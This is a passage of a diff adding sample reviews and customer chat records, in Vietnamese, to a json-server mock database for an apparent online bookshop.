+      "comment": "Truyện Conan tập 100 giao hàng hơi chậm, đóng gói tạm được.",
+      "createdAt": "2026-05-24T02:10:00.000Z",
+      "id": "rev_4"
+    },
+    {
+      "productId": "XxGDdYUaXN4",
+      "userId": "3u7_xNCADHQ",
+      "username": "duyy",
+      "rating": 5,
+      "comment": "ok\n",
+      "createdAt": "2026-05-24T17:05:21.677Z",
+      "id": "XqqXt9l2fpQ",
+      "replyContent": "thank kiu",
+      "repliedAt": "2026-05-24T17:05:38.320Z",
+      "repliedBy": "Nhân Viên Bán Hàng"
+    }
+  ],
+  "chats": [
+    {
+      "id": "chat_3",
+      "userId": "phan_minh_khang",
+      "customerName": "Phan Minh Khang",
+      "avatar": "https://ui-avatars.com/api/?name=Phan+Minh+Khang&background=3b82f6&color=fff",
+      "lastMessage": "Shop cho mình xin thông tin thanh toán với chuyển khoản ngân hàng nhé.",
+      "updatedAt": "2026-05-24T09:45:00.000Z",
+      "unread": false,
+      "messages": [
+        {
+          "id": "m6",
+          "sender": "customer",
+          "text": "Mình muốn đặt 2 quyển Đắc Nhân Tâm",
+          "time": "2026-05-24T09:40:00.000Z"
+        },
+        {
+          "id": "m7",
+          "sender": "customer",
+          "text": "Shop cho mình xin thông tin thanh toán với chuyển khoản ngân hàng nhé.",
+          "time": "2026-05-24T09:45:00.000Z"
+        }
+      ]
+    },
+    {
+      "userId": "duyy",
+      "customerName": "duyy",
+      "avatar": "https://ui-avatars.com/api/?name=duyy&background=0f172a&color=fff",
+      "lastMessage": "ok cu",
+      "updatedAt": "2026-05-24T16:35:56.468Z",
+      "unread": false,
+      "messages": [
+        {
+          "id": "m_1779640442381",
+          "sender": "customer",
+          "text": "onepiece còn ko shop",
+          "time": "2026-05-24T16:34:02.381Z"
+        },
+        {
+          "id": "m_1779640471046",
+          "sender": "staff",
+          "text": "Dạ chào bạn, sách này hiện đang còn hàng ạ!",
+          "time": "2026-05-24T16:34:31.046Z"
+        },
+        {
+          "id": "m_1779640556468",
+          "sender": "staff",
+          "text": "ok cu",
+          "time": "2026-05-24T16:35:56.468Z"
+        }
+      ],
+      "id": "562gPA31CdA"
+    }
+  ],
   "$schema": "./node_modules/json-server/schema.json"
 }
